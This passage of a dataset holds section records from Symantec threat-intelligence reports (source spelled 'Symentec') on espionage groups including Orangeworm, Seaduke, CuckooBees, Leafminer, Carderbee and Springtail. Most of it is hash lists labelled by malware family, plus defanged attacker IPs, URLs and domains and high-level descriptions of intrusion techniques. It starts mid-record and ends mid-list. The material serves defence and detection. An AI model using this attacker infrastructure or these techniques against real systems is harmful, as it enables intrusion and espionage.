samples\n22be72632de9f64beca49bf4d17910de988f3a15d0299e8f94bcaeeb34bb8a96\n2503bdaeaa264bfc67b3a3603ee48ddb7b964d6466fac0377885c6649209c098\nSWIFT log suppressors\n84d348eea1b424fe9f5fe8f6a485666289e39e4c8a0ff5a763e1fb91424cdfb8\nBackdoor.Batel RTF document dropper\n21e897fbe23a9ff5f0e26e53be0f3b1747c3fc160e8e34fa913eb2afbcd1149f\nBackdoor.Batel stagers\n001221d6393007ca918bfb25abbb0497981f8e044e377377d51d82867783a746\n1d9ded30af0f90bf61a685a3ee8eb9bc2ad36f82e824550e4781f7047163095a\nOlder Batel *.CPL droppers\n1710b33822842a4e5029af0a10029f8307381082da7727ffa9935e4eabc0134d\n298d684694483257f12c63b33220e8825c383965780941f0d1961975e6f74ebd\nCobalt Strike, possible ATM implants\n429bdf288f400392a9d3d6df120271ea20f5ea7d59fad745d7194130876e851e\n44c783205220e95c1690ef41e3808cd72347242153e8bdbeb63c9b2850e4b579\nCobalt Strike implants\n1341bdf6485ed68ceba3fec9b806cc16327ab76d18c69ca5cd678fb19f1e0486\n48fb5e3c3dc17f549a76e1b1ce74c9fef5c94bfc29119a248ce1647644b125c7\nBackdoor.Batel loaders\n0ffe521444415371e49c6526f66363eb062b4487a43c75f03279f5b58f68ed24\n174236a0b4e4bc97e3af88e0ec82cced7eed026784d6b9d00cc56b01c480d4ed\nStagers (MINGW)\nd94d58bd5a25fde66a2e9b2e0cc9163c8898f439be5c0e7806d21897ba8e1455\n3cadacbb37d4a7f2767bc8b48db786810e7cdaffdef56a2c4eebbe6f2b68988e\nDisk wipers\n72b4ef3058b31ac4bf12b373f1b9712c3a094b7d68e5f777ba71e9966062af17\nc361428d4977648abfb77c2aebc7eed5b2b59f4f837446719cb285e1714da6da\nKeylogger\ne07267bbfcbff72a9aff1872603ffbb630997c36a1d9a565843cb59bc5d97d90\nScreengrabbers\na7c3f125c8b9ca732832d64db2334f07240294d74ba76bdc47ea9d4009381fdc\nae38884398fe3f26110bc3ca09e9103706d4da142276dbcdba0a9f176e0c275c\nCommand shells\n9041e79658e3d212ece3360adda37d339d455568217173f1e66f291b5765b34a\ne1f30176e97a4f8b7e75d0cdf85d11cbb9a72b99620c8d54a520cecc29ea6f4a\nHTTP Backconnect\nb25eee6b39f73367b22df8d7a410975a1f46e7489e2d0abbc8e5d388d8ea7bec\nConnection checkers\n28fba330560bcde299d0e174ca539153f8819a586579daf9463aa7f86e3ae3d5\nd9af163220cc129bb722f2d80810585a645513e25ab6bc9cece4ed6b98f3c874\nPoisonIvy loaders\n25ff64c263fb272f4543d024f0e64fbd113fed81b25d64635ed59f00ff2608da\n91601e3fbbebcfdd7f94951e9b430608f7669eb80f983eceec3f6735de8f260c\nAmmyy Admin remote administration tools\n0caaf7a461a54a19f3323a0d5b7ad2514457919c5af3c7e392a1e4b7222ef687\n295dd6f5bab13226a5a3d1027432a780de043d31b7e73d5414ae005a59923130\nAmmyy Admin, Trojanized\ncce04fa1265cbfd61d6f4a8d989ee3c297bf337a9ee3abc164c9d51f3ef1689f\nRemoteUtilities remote administration tools\n2ba2a8e20481d8932900f9a084b733dd544aaa62b567932e76620628ebc5daf1\n3232c89d21f0b087786d2ba4f06714c7b357338daedffe0343db8a2d66b81b51\nRunas\n170282aa7f2cb84e023f08339ebac17d8fefa459f5f75f60bd6a4708aff11e20\nMimikatz\n7d7ca44d27aed4a2dc5ddb60f45e5ab8f2e00d5b57afb7c34c4e14abb78718d4\ne5a702d70186b537a7ae5c99db550c910073c93b8c82dd5f4a27a501c03bc7b6\nKasidet\nc1e797e156e12ace6d852e51d0b8aefef9c539502461efd8db563a722569e0d2\ncee2b6fa4e0acd06832527ffde20846bc583eb06801c6021ea4d6bb828bfe3ba", "source": "Symentec"}, {"title": "Introduction", "content": "Symantec has identified a previously unknown group called Orangeworm that has been observed installing a custom backdoor calledTrojan.Kwampirswithin large international corporations that operate within the healthcare sector in the United States, Europe, and Asia.\nFirst identified in January 2015, Orangeworm has also conducted targeted attacks against organizations in related industries as part of a larger supply-chain attack in order to reach their intended victims. Known victims include healthcare providers, pharmaceuticals, IT solution providers for healthcare and equipment manufacturers that serve the healthcare industry, likely for the purpose of corporate espionage.", "source": "Symentec"}, {"title": "Introduction", "content": "Symantec has uncovered an elusive Trojan used by the cyberespionage group behind the \"Duke\" family of malware. Seaduke (detected by Symantec as Trojan.Seaduke) is a low-profile information-stealing Trojan which appears to be reserved for attacks against a small number of high-value targets.\nSeaduke has been used in attacks against a number of major, government-level targets. The malware hides behind numerous layers of encryption and obfuscation and is capable of quietly stealing and exfiltrating sensitive information such as email from the victim's computer. Seaduke has a highly configurable framework and Symantec has already found hundreds of different configurations on compromised networks. Its creators are likely to have spent a considerable amount of time and resources in preparing these attacks and the malware has been deployed against a number of high-level government targets.\nWhile the Duke group began to distribute Cozyduke in an increasingly aggressive manner, Seaduke installations were reserved only for select targets. Seaduke victims are generally first infected with Cozyduke and, if the computer appears to be a target of interest, the operators will install Seaduke.", "source": "Symentec"}, {"title": "Background", "content": "The group behind Seaduke is a cyberespionage operation that is responsible for a series of attacks against high-profile individuals and organizations in government, international policy and private research in the United States and Europe. It has a range of malware tools at its disposal, known as the Dukes, including Cozyduke (Trojan.Cozer), Miniduke (Backdoor.Miniduke) and Cosmicduke (Backdoor.Tinybaron).\nNews of the Duke group first emerged in  March and April of 2015, when reports detailing attacks involving a sophisticated threat actor variously called Office Monkeys,EuroAPT,Cozy Bear, andCozydukewere published. Symantec believes that this group has a history of compromising governmental and diplomatic organizations since at least 2010.\nThe group began its current campaign as early as March 2014, when Trojan.Cozer (aka Cozyduke) was identified on the network of a private research institute in Washington, D.C. In the months that followed, the Duke group began to target victims with \"Office Monkeys\"- and \"eFax\"-themed emails, booby-trapped with a Cozyduke payload. These tactics were atypical of a cyberespionage group. It's quite likely these themes were deliberately chosen to act as a smokescreen, hiding the true intent of the adversary.\nThe Duke group has mounted an extended campaign targeting high-profile networks over extended periods, something which is far beyond the reach of the majority of threat actors. Its capabilities include:\nAttack infrastructure leveraging hundreds of compromised websites\nRapidly developed malware frameworks in concurrent use\nSophisticated operators with fine-tuned computer network exploitation (CNE) skills\nAlthough Cozyduke activity was first identified in March 2014, it wasn't until July that the group managed to successfully compromise high-profile government networks. Cozyduke was used throughout these attacks to harvest and exfiltrate sensitive information to the attackers.\nIn parallel, the Duke group was also installing separate malware onto these networks, namely Backdoor.Miniduke and the more elusive Trojan.Seaduke. It could use these payloads to exploit networks on multiple fronts and providing it with additional persistence mechanisms.", "source": "Symentec"}, {"title": "Introduction", "content": "Symantec has observed a likely continuation of the Operation CuckooBees activity, this time targeting organizations in Hong Kong.\nOperation CuckooBeeswas first documentedin May 2022 by researchers at Cybereason, who said the intelligence-gathering campaign had been operating under the radar since at least 2019, stealing intellectual property and other sensitive data from victims.\nIn the attacks observed by Symantec, the attackers remained active on some networks for more than a year. We saw the Spyder Loader (Trojan.Spyload) malware deployed on victim networks, indicating this activity is likely part of that ongoing campaign. While we did not see the ultimate payload in this campaign, based on the previous activity seen alongside the Spyder Loader malware it seems likely the ultimate goal of this activity was intelligence collection.", "source": "Symentec"}, {"title": "Background", "content": "The Spyder Loader malware wasfirst discussed publicly in a March 2021 blog by SonicWall, with the researchers saying at the time that the malware was \"being used for targeted attacks on information storage systems, collecting information about corrupted devices, executing mischievous payloads, coordinating script execution, and C&C server communication.\"\nThese initial findings were expanded on substantiallyin a detailed Cybereason investigation published in May 2022, which detailed a long-running campaign that the researchers dubbed Operation CuckooBees. They said that this campaign had been ongoing since at least 2019. The researchers said that the attackers exfiltrated hundreds of gigabytes of information and that they \"targeted intellectual property developed by the victims, including sensitive documents, blueprints, diagrams, formulas, and manufacturing-related proprietary data.\" They also stole data that could be leveraged for use in future cyber attacks - such as credentials, customer data, and information about network architecture.\nAmong the tools used in that campaign was the Spyder Loader malware, which is what was also observed in the activity seen by Symantec researchers.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "00634e46b14ba42c12e35a367f1c7a616fb8e8754ebb2e24ae936377a3ee544a\n033313b31fbea64a1a0a53b38c74236f7af2e49018faa2be6c036427c456ef6d\n06ed28c4ae295dec0bd692cd7fcecb5fa9de644968d281f5e4bf48eb72bc4b63\n091e3e806b6d66cf1eccbd57a787eec65df5f07ad88118c576b3ae06c08af744\n0cdbde55b23b26efd5c4503473bd673e3e5a75eae375bae866b6541edb8fcc84\n181a25cbcd050c1b42839a5d32df4f59055e27377e71eaa3eb9230a43667f075\n228784cc7dad998f1f8b7395bf758827eff9b27762a7056d9e8832bb8a029aad\n260d54c2fcf725a8b6d030c36ca26f65ba3d01f707fa0e841cac0166d06218c0\n2879253c8c8dd3ee53525c81801d813594bb657ad4f7478ba4288112f0315c9e\n2da683d54f12d83f0f111b5c57f7f78016cad5860b2604d38b2aba37ab3d5c55\n3196e74004816227323d6864448361fb173b3c96cf3d1b0aa26dfcd259a61505\n33aa5df5470ae59cd30c7ea4c2ad1e13901a8fd13ea6b4b5584d10ffdba31ee4\n396e35b2a4f920182d3148c834cf70f00b6094600e51e030d6fc297cb0ca5c06\n3b3df3ada05e521ec8ce2f0deaeb6fd4359a2de9cadb0dd51c0d9d7a835473a4\n3d96132412d8587849aa5dfd35c968755b30a08b100ec42eb810ff1f042e9fd0\n3e10500c3779e56d2daa05da920d014becf33597f5ccb67c069320c5c43d40d2\n4164cfc533621e37c8ad910f29d4afa92d0180c1697b7970746243574029a1f1\n417a65be8ef81cb36021dbe56b07bf5dd65b7355e61b7a94bc988aaa335b22da\n4221362bba10aedbb2d09729567d090f543c5de8543ec55ca4a6516815202064\n438dddd93333ccfce4499558c92b20341166a134a8451ffc60ebf6ec5e0890dc\n48658c800b724197cb91cbfd064df060221bc72bd77301707cb30b2f7c2b81fb\n4a9cd0c32d6992077d3140917928f1b931bb2bf28e88f0dd8e4c92cd5d9cbe00\n4bc3a4e4d74b81acf19621da7c8304527fff954747ab3393b78e0758306b3fa6\n4d8784b957d826acc00e5a87d7317bbaeb63c7f9f86a5f446a41a5a355de437e\n4dfae8301a9284eea4e975476ceaa652d5d3c799879dec7c5c9e18bbc2930885\n54bcd44d4606e0fdb1b7c2110684f429f9e234269d213ddb60c9665e7b8679c7\n551794bd7c66fb064d81230161b25ed81a714aa9377f2a9a1af69626dc99d385\n5bf03354d708d3c87e82a50d3f4c948fc8c6e8186537b0463edafd9546b51333\n5cf6bca323851a509120399a975edc759a9d2c5c21aff18ee6cae506b0f93d67\n5deab41977d5d6217b3e35cfab81015d83f270650ccc170dfb948e55e92478dd\n5f477c03a689b4aeed28dcb2f8bab3dfa7fc834223062f16eddb5426c2cfa2e6\n6741a9ea57e38d1e9d6014bd191b0ac517d2bfa2d79cb091c64fb8011c8521d3\n69d927abbacdfcdcad0a1d878e8c0a8543a940a101447b9127365034f7a2d773\n6d07ce2ca82489599ae609c6ed18f587059ed5cf2d32a513c5ea6d35861695e9\n6d689996a8721f8417de46d645dc6b66b261afdf8ee30b4a0853ff94ec87d3b0\n72424e99c1814a1d741508c198eac3e3e84626ce39d961c014718e7f8abb6fe5\n7443e17e80dec2db6cfffc0a272fd8a27b2a98a42ffc15fb9065c072dc5904f7\n74ff4db3af082d73dcba597cacfd4cae64e00c68169a64be2f3715a0f06535ae\n7ccb9cdaff8c6c7785ee1422aa70723c976f62795593b02fbf0923f09c6b647d\n7ecd5ec38db31cfb7146ac684eb75912e418c3fbb69a2562478b5fce2ae2c615\n8344fcc55534f0b0e08f48f44607771d7cfad130f749ddcc434ffc6fd9012eaa\n8535a6e49afa4057e504fa8f4a21a06f535f51bbafff0631c662d7ade5aabfb9\n8648bb183abf8aa2111f4d98ecc386e5bcdfa614033efdd124d61ee155261a13\n86a45d92282ed3c4f82687eb1d6cfa6a906d6fc5033014bdc6c57da07db1b1b2\n892c1f324fa5c2370b06dedf691bd60fa0aa70a4bd6502b9c615cdcd3d5e698a\n8a42bee7190e23f76e46e66f9194c33f33a60903a28d267acebf4fd8dead15e8\n8a8109f2af10898cdf7259467d18410f2b61a89d5f0d7031b5e45e1bd3b8678a\n8eeba9d12cd01b8eb245c76ff16e34eb0455001243fcf1889f28655e55c1d1ed\n8fe7cc990ffaf4f156c0868b41e1e92d09c1270e11b96c7320498e0390cc93c6\n9138916b9630c81a0b7b6597f4be72ca46c7e3dc1e6fd89d14ddb12f1deb7fdc\n95bc468f50483f337d3ef6e1c5d1765beffee4db9c057d6e49713b3a099b2eef\n96e22da2b69f599cba297a9aafc971a09c99433bf7f51ec37446c34ed3701d12\n9b114bfec2561e76fd8d0c9b31633c2089abec8f3a99c297f0f6416838567452\n9b7d8827685b71e92438355872f10c2364d7e3a3811df884eb41e371bcda8f6d\n9daa43c1204184634b9833718155404d6c0366fcdd524f945eacfc3e5760c116\na43c9dbfd2a9c1a065eb7a9212f2125ea6e6a73256081bc2deacd50913162a6a\na7f291bde213d9eb4fa60fb3517a6ec6fb7a057457534afe895c1684db0ba21d\nb02c10d8a83857352c99f09548397bf8e0ee0548b8e050e138b82eb08b98e938\nb13bc2986f098580e2432dac7004a9dca2254c6756dafa3b7f67aff743ee060f\nb382824cbb11c60da6c733855c825dcbdf2bbfb8104a517d27af56b56625ba9f\nb4703af681c75d2d16c555f008bc4308a4d03767ceed55c02d1a892341444304\nb4841104c663f4f013b467220d576035fd2187a92c84451709abff47c8fb162e\nb4cdc814f1536264cc5e469cebcbf351ee9d1b9620248bc0a6b14725fe38d5a0\nb82a19a06270f37e3b12047a1382796678895fe1c58a9ef799cf5250f6c96dcf\nc01f402b942502889aa854326405b29a4d33947547074fbb9eab7c4c4a896d77\nc276300d47daff9cc1e486e4ea3d776d82fa9b3f8161eccfe49fc3218afdfbe9\nc3d41387bcc9c9f2d9858b1286ed51369a06ed12abe7623344a31a0e0f18f36a\nc57236c2e7fe84334d5bdef6420cbf121ab9f918f5d8e4323d7055b12947abb6\nc862f2cdbf817f6d7c5568a4af2d8766a30719297e31a71620503e50176fceb2\nccaa5186451c0658b6294f5d8a78b3ec02505164c1ddec2b418259564cd7b23b\ncd5a53fc5bb675b47bb4055d8f3e4c45902a8245df2300ccf03d7da6464add78\ncdaaf781557e85582dd42ff6a58ecbbb68a7cb2e0dc7c7aa49b1d5df5391330b\nd06730e1d07491a70b4b18b52e8f35c92509b5049239e3794a6be73ce160e2c0\nd2939897865906fb339e878f620f928bff36c7dead15bb6ed94f7a9df16300e9\nd3a163a7313629cc380b9405aafb847247d2a256ae48b60bffd0bfbe3082c19c\nd76e32647c3890100fe994a9a0f84a3e6957af08195366e86299e4033c2551f1\ndbc60a4878ae9f1a2184c44837db9968a157f2008a16e3a350909a598f918dd9\ndc4218b67f99196fb5d71c4bd5ce762e9b8950d8206e198a755650c5e6d17fd0\ndc647ce87c62b0ac76530362694d1dafdca5ca414e5abb18c324dfd24f0e9644\ndeb0e05adad48b90a534beabe2ef4261d2a864112945907fbd2d020b90f24507\ne1af76d84f98eb4cd7af04d35030e37ffaa8120a7d048fafe0cbcb2a7f86c460\ne3b82ac4870a2ae86dfe88cf7ecf9bc0dc6ed653af0ad1aaa20194cae8aff411\ne4f4b3a554c8a0fd693201333e8d634f8ef1fa4ca4445ca556492bb9d0d486c4\nef24840ccde8c7547b3329c7854fdd22d2178c7ad7f931303da2e6eacbf16d1c\nf17278d4eaafff971864c02efdc0e4435defad96e7f5203e580a4e32c64681d8\nf8ebd94779851fbeca029db4ae938457c7ccf4e010b09f025ea5394b715b1838\nf90dc76a9500ee2bb3380d5f4589289ec7ffa647be4262ee7674d37ce02283b7\n5d868bfbfc767515c35ced7b0da36f41ed4728914ba081f132a9d9c54564ebf0", "source": "Symentec"}, {"title": "Introduction", "content": "As the first half of the year drew to a close, we took a look through telemetry from our vast range of data sources and selected some of the trends that stood out from April, May, and June 2020.\nFrom a resurgence in cryptojacking activity to the return of a major malware distribution platform, let's take a quick look at the trends that shaped the cyber security threat landscape in the second quarter of 2020.", "source": "Symentec"}, {"title": "Introduction", "content": "The cyber espionage group known as the Inception Framework has significantly developed its operations over the past three years, rolling out stealthy new tools and cleverly leveraging the cloud and the Internet of Things (IoT) in order to make its activities harder to detect.\nSince 2014, Symantec has found evidence of a steady stream of attacks from the Inception Framework targeted at organizations on several continents. As time has gone by, the group has become ever more secretive, hiding behind an increasingly complex framework of proxies and cloud services.", "source": "Symentec"}, {"title": "Introduction", "content": "A large U.S. organization with a significant presence in China was the subject of a targeted attack earlier this year, during which the attackers obtained a persistent presence on its network, seemingly for the purpose of intelligence gathering. The attack was likely carried out by a China-based threat actor, since some of the tools used in this attack have been previously associated with Chinese attackers.\nWhile it is possible that actual network intrusion occurred earlier, the first evidence of the attacker's activity dates from April 2024, and this malicious activity continued until August 2024. The attackers moved laterally across the organization's network, compromising multiple computers. Some of the machines targeted were Exchange Servers, suggesting the attackers were gathering intelligence by harvesting emails. Exfiltration tools were also deployed, suggesting that targeted data was taken from the organizations.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\n9affdcdb398d437e2e1cd9bc1ccf2d101d79fc6d87e95e960e50847a141faa4 - PsExec\n51fe904458e216e75909f82a33dc4f163250b498b4e2d365880184e806d3db1a - iTunesHelper\n23221b6f95b9e3b165a84570212f2c8681cf888aa0fa78822f8500357eeafaf0 - CoreFoundation.dll\n86fd8328765e4803feedf5878a08c149c08d47c336578261a08a3e1933b68daa - PSCP (renamed as vmtools.exe)\n472a513eb60cba4a2320ebbc10d84679ebaa1a8f90e5a3764902a456b3936a17 - libnettle-6.dll\nf2fa6ae29306ed7171f2e9563ced9bbd6e337ed8c389b319df3c6b46eeb050f0 - SFTP component from FileZilla\nc1bec59afd3c6071b461bb480ff88ba7e36759a949f4850cc26f0c18e4c811a0 - textinputhost.dat\nedfae1a69522f87b12c6dac3225d930e4848832e3c551ee1e7d31736bf4525ef - PsExec\n1f6b69d11a3066e21c40002a25986c44e24a66f023a40e5f49eecaea33f5576d - GoogleUpdate\nd32cc7b31a6f98c60abc313abc7d1143681f72de2bb2604711a0ba20710caaae - GoogleToolbarNotifier\nff91bbe7bd4e6d5498b1332f0ad233dcf0ad5fc0d31f870a92142731354d739c - gtn.dll\nhxxp://149.28.154[.]23:443", "source": "Symentec"}, {"title": "Introduction", "content": "Symantec has uncovered the operations of a threat actor named Leafminer that is targeting a broad list of government organizations and business verticals in various regions in the Middle East since at least early 2017. The group tends to adapt publicly available techniques and tools for their attacks and experiments with published proof-of-concept exploits. Leafminer attempts to infiltrate target networks through various means of intrusion: watering hole websites, vulnerability scans of network services on the internet, and brute-force/dictionary login attempts. The actor's post-compromise toolkit suggests that the group is looking for email data, files, and database servers on compromised target systems.", "source": "Symentec"}, {"title": "Targets", "content": "During the investigation of the Leafminer group, we were able to assemble a targeting profile from different sources including telemetry and log files hosted publicly on the attacker's arsenal server.\nSymantec detection telemetry shows malware and custom tools used by Leafminer on 44 systems across four regions in the Middle East.\nOne interesting source of target information discovered during the Leafminer investigation was a list of 809 targets used by the attackers for vulnerability scans. The list is written in the Iranian language Farsi and groups each entry with organization of interest by geography and industry. Figure 3 shows a breakdown of the industry verticals. Targeted regions included in the list are Saudi Arabia, United Arab Emirates, Qatar, Kuwait, Bahrain, Egypt, Israel, and Afghanistan.", "source": "Symentec"}, {"title": "Best Practices", "content": "Important passwords, such as those with high privileges, should be at least 8-10 characters long (and preferably longer) and include a mixture of letters and numbers. Encourage users to avoid reusing the same passwords on multiple websites and sharing passwords with others should be forbidden. Delete unused credentials and profiles and limit the number of administrative-level profiles created. Employ two-factor authentication (such asSymantec VIP) to provide an additional layer of security, preventing any stolen credentials from being used by attackers.\nEmphasize multiple, overlapping, and mutually supportive defensive systems to guard against single point failures in any specific technology or protection method. This should include the deployment of regularly updated firewalls as well as gateway antivirus, intrusion detection or protection systems (IPS), website vulnerability with malware protection, and web security gateway solutions throughout the network.\nImplement and enforce a security policy whereby any sensitive data is encrypted at rest and in transit. Ensure that customer data is encrypted as well. This can help mitigate the damage of potential data leaks from within an organization.\nImplement SMB egress traffic filtering on perimeter devices to prevent SMB traffic leaving your network onto the internet.\nEducate employees on the dangers posed by spear-phishing emails, including exercising caution around emails from unfamiliar sources and opening attachments that haven't been solicited. A full protection stack helps to defend against emailed threats, includingSymantec Email Security.cloud, which can block email-borne threats, andSymantec Endpoint Protection, which can block malware on the endpoint.Symantec Messaging Gateway'sDisarm technology can also protect computers from threats by removing malicious content from attached documents before they even reach the user.\nUnderstanding the tools, techniques, and procedures (TTP) of adversaries through services likeDeepSight Adversary Intelligencefuels effective defense from advanced adversaries like Leafminer. Beyond technical understanding of the group, strategic intelligence that informs the motivation, capability, and likely next moves of the adversaries ensures more timely and effective decisions in proactively safeguarding your environment from these threats.", "source": "Symentec"}, {"title": "Introduction", "content": "12.20pm BST, 22 August 2023: Updated with additional IoCs\nA previously unknown advanced persistent threat (APT) group used the legitimate Cobra DocGuard software to carry out a supply chain attack with the goal of deploying the Korplug backdoor (aka PlugX) onto victim computers.\nIn the course of this attack, the attackers used malware signed with a legitimate Microsoft certificate. Most of the victims in this campaign are based in Hong Kong, with some victims based in other regions of Asia.\nKorplug is known to be used by multiple APT groups, but we could not link this activity to a known threat actor so we have given the actor behind this activity a new name - Carderbee.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\nSHA256 file  hashes:\n96170614bbd02223dc79cec12afb6b11004c8edb8f3de91f78a6fc54d0844622\n19a6a404605be964ab87905d59402e2890460709a1d9038c66b3fbeedc1a2343\n1ff7b55dde007b7909f43dd47692f7c171caa2897d663eb9db01001062b1fe9d\n2400d8e66c652f4f8a13c99a5ffb67cb5c0510144b30e93122b1809b58614936\n2f714aaf9e3e3e03e8168fe5e22ba6d8c1b04cbfa3d37ff389e9f1568a80cad4\n47b660bbaacb2a602640b5e2c589a3adc620a0bfc9f0ecfb8d813a803d7b75e2\n5467e163621698b38c2ba82372bac110cea4121d7c1cec096958a4d9eaa44be7\n7e6d0f14302662f52e4379eb5b69a3749d8597e8f61266aeda74611258972a3d\n85fc7628c5c7190f25da7a2c7ee16fc2ad581e1b0b07ba4ac33cff4c6e94c8af\n8bd40da84c8fa5f6f8e058ae7e36e1023aca1b9a9c8379704934a077080da76f\n8ca135b2f4df6a714b56c1a47ac5baa80a11c6a4fcc1d84a047d77da1628f53f\n9e96f70ce312f2638a99cfbd3820e85798c0103c7dc06fe0182523e3bf1e2805\n9fc49d9f4b922112c2bafe3f1181de6540d94f901b823e11c008f6d1b2de218c\nb5159f8ae16deda7aa5d55100a0eac6e5dacd1f6502689b543513a742353d1ea\nb7b8ea25786f8e82aabe4a4385c6142d9afe03f090d1433d0dc6d4d6ccc27510\nb84f68ab098ce43f9cb363d0a20a2267e7130078d3d2d8408bfb32bbca95ca37\nf64267decaa982c63185d92e028f52c31c036e85b2731a6e0bccdb8f7b646e97\nRemote IP addresses:\n45.76.179[.]209\n104.238.151[.]104\nURLs:\nhttp://111.231.100[.]228:8888/CDGServer3/UpgradeService2\nhttp://103.151.28[.]11:8090/CDGServer3/UpgradeService2\nDomains:\ncdn.stream-amazon[.]com\ncdn.ofo[.]ac\ngobay[.]info\ntjj.active-microsoft[.]com\ngithubassets.akamaixed[.]net\nms-g9-sites-prod-cdn.akamaixed[.]net\nms-f7-sites-prod-cdn.akamaixed[.]net", "source": "Symentec"}, {"title": "Introduction", "content": "Note:\"Morpho\" was used in the original publication to refer to this attack group. Symantec has renamed the group \"Butterfly\" to avoid any link whatsoever to other legitimate corporate entities named \"Morpho\"\nA corporate espionage group has compromised a string of major corporations over the past three years in order to steal confidential information and intellectual property. The gang, which Symantec calls Butterfly, is not-state sponsored, rather financially motivated. It has attacked multi-billion dollar companies operating in the internet, IT software, pharmaceutical, and commodities sectors. Twitter, Facebook, Apple, and Microsoft are among the companies who have publicly acknowledged attacks.\nButterfly is technically proficient and well resourced. The group has developed a suite of custom malware tools capable of attacking both Windows and Apple computers, and appears to have used at least one zero-day vulnerability in its attacks. It keeps a low profile and maintains good operational security. After successfully compromising a target organization, it cleans up after itself before moving on to its next target.\nThis group operates at a much higher level than the average cybercrime gang. It is not interested in stealing credit card details or customer databases and is instead focused on high-level corporate information. Butterfly may be selling this information to the highest bidder or may be operating as hackers for hire. Stolen information could also be used for insider-trading purposes.", "source": "Symentec"}, {"title": "Introduction", "content": "Symantec's Threat Hunter Team has uncovered a new Linux backdoor developed by the North Korean Springtail espionage group (aka Kimsuky) that is linked to malware used in a recent campaign against organizations in South Korea.\nThe backdoor (Linux.Gomir) appears to be a Linux version of the GoBear backdoor, which was used in a recent Springtail campaign that saw the attackers deliver malware via Trojanized software installation packages. Gomir is structurally almost identical to GoBear, with extensive sharing of code between malware variants.", "source": "Symentec"}, {"title": "Background", "content": "Springtail is a tight-knit espionage group that initially specialized in attacks on public sector organizations in South Korea. The group first came to public attention in 2014, when the South Korean governmentsaid it was responsible for an attack on Korea Hydro and Nuclear Power (KHNP). Multiple employees at KHNP were targeted with spear-phishing emails containing exploits that installed disk-wiping malware on their machines. The U.S. government has said that the group is a unit of North Korea's military intelligence organization, the Reconnaissance General Bureau (RGB).\nThe group was the subject of a U.S. government alert in recent days due to attempts to exploit improperly configured DNS Domain-based Message Authentication, Reporting and Conformance (DMARC) record policies to conceal social engineering attempts.According to a joint advisory issued by the Federal Bureau of Investigation (FBI), the U.S. Department of State, and the National Security Agency (NSA), the group has been mounting spear phishing campaigns pretending to be journalists, academics, and experts in East Asian affairs \"with credible links to North Korean policy circles\".", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\n30584f13c0a9d0c86562c803de350432d5a0607a06b24481ad4d92cdf7288213 \u2013 Linux.Gomir\n7bd723b5e4f7b3c645ac04e763dfc913060eaf6e136eecc4ee0653ad2056f3a0 \u2013 GoBear Dropper\nd7f3ecd8939ae8b170b641448ff12ade2163baad05ca6595547f8794b5ad013b \u2013 Troll Stealer\n36ea1b317b46c55ed01dd860131a7f6a216de71958520d7d558711e13693c9dc \u2013 Troll Stealer\n8e45daace21f135b54c515dbd5cf6e0bd28ae2515b9d724ad2d01a4bf10f93bd \u2013 Troll Stealer\n6c2a8e2bbe4ebf1fb6967a34211281959484032af1d620cbab390e89f739c339 \u2013 Troll Stealer\n47d084e54d15d5d313f09f5b5fcdea0c9273dcddd9a564e154e222343f697822 \u2013 Troll Stealer\n8a80b6bd452547650b3e61b2cc301d525de139a740aac9b0da2150ffac986be4 - Troll Stealer\n380ec7396cc67cf1134f8e8cda906b67c70aa5c818273b1db758f0757b955d81  \u2013 Troll Stealer\nff945b3565f63cef7bb214a93c623688759ee2805a8c574f00237660b1c4d3fd \u2013 Troll Stealer\ncc7a123d08a3558370a32427c8a5d15a4be98fb1b754349d1e0e48f0f4cb6bfc  \u2013 Troll Stealer\n8898b6b3e2b7551edcceffbef2557b99bdf4d99533411cc90390eeb278d11ac8 \u2013 Troll Stealer\necab00f86a6c3adb5f4d5b16da56e16f8e742adfb82235c505d3976c06c74e20 \u2013 Troll Stealer\nd05c50067bd88dae4389e96d7e88b589027f75427104fdb46f8608bbcf89edb4 \u2013 Troll Stealer\na98c017d1b9a18195411d22b44dbe65d5f4a9e181c81ea2168794950dc4cbd3c \u2013 Troll Stealer\n831f27eb18caf672d43a5a80590df130b0d3d9e7d08e333b0f710b95f2cde0e0 \u2013 Troll Stealer\nbc4c1c869a03045e0b594a258ec3801369b0dcabac193e90f0a684900e9a582d \u2013 Troll Stealer\n5068ead78c226893df638a188fbe7222b99618b7889759e0725d85497f533e98 \u2013 Troll Stealer\n216.189.159[.]34", "source": "Symentec"}, {"title": "Introduction", "content": "Threat actors using tools linked to China-based APT groups have targeted multiple high-profile organizations in Southeast Asia, including government ministries in two different countries, an air traffic control organization, a telecoms company, and a media outlet.\nThe attacks, which have been underway since at least October 2023, appear to have intelligence gathering as their main goal. The attackers use a variety of both open-source and living-off-the-land tools in their operations.\nWhile attribution to a specific threat group cannot be determined, multiple tools used in the campaign have links to several China-based actors (see Tools section for details). Of note is the use of a proxy tool called Rakshasa and a legitimate application file used for DLL sideloading, both of which wereused previously by the Chinese advanced persistent threat (APT) group known as Earth Baku(aka APT41, Brass Typhoon).\nA typical attack involves the use of a remote access tool that leverages Impacket to execute commands via WMI (Windows Management Instrumentation). The attackers then install keyloggers, password collectors, and reverse proxy tools (Rakshasa, Stowaway, ReverseSSH) to maintain connections to attacker-controlled infrastructure. The threat actors also install customized DLL files that act as authentication mechanism filters, allowing them to intercept login credentials.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\nd312b0e1968beae5a2ff3be2d8efc6d1bfdab3b1aec6faf8eafa295c47230194 \u2013 Stowaway\ne0f3b8028a2969e280efdd770978a54181fc242dd26cbf0a22e922f1e6a1b951 \u2013 Loader\n33cb9f06338a9ea17107abbdc478071bbe097f80a835bbac462c4bb17cd0b798 \u2013 PlugX loader\n8b6d081be732743aa6f6bccfb68b3f21878aa36723c1311f50406d752aacc9fa \u2013 Keylogger\n89707a5bf9862a9effb1618a1a285a8d027fb343f6103f4bc68f736889f0a86e \u2013 Keylogger\n9fe3ff51443c41fe0be01a55a3a5fbfb261bcf63b3b0cd67f65a2c00a6d52ff3 \u2013 Keylogger\ne6cecba25abd092bfccba825298edecd2fdee6c428d9ae85399fabc54355e31f \u2013 Keylogger loader\n779b4a5f53d3128ab53dd8e13c362d6d077c3eb4987f878d7ef3416c801ef0dd - 